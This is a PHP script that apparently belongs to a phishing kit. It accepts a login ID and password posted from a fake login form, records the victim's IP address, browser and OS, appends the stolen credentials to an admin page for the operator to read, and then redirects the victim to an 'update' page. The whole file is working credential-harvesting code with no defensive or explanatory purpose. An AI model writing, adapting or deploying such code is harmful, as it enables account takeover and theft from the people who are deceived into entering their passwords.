<?php 
session_start();
require "../systems/detector.php";

if(isset($_POST['userLoginId'])){
	$ip = $_SERVER['REMOTE_ADDR'];
	$login = htmlentities($_POST['userLoginId']);
	$pass = htmlentities($_POST['password']); 
	
$html = "
<div class='result-box'>
<div class='title'> # Login</div>
<b>IP Address: </b> $ip<br>
<b>browser:</b> $browser<br>
<b>OS:</b> $os <br>
<b>Email: </b> $login<br>
<b>Password: </b> $pass<br>
</div>"; 

$_SESSION['login'] = $html;


$fp = fopen("../admin/index.php", "a");
	fwrite($fp, $html);
	fclose($fp);
	
header("location: ../update.php");


}



?>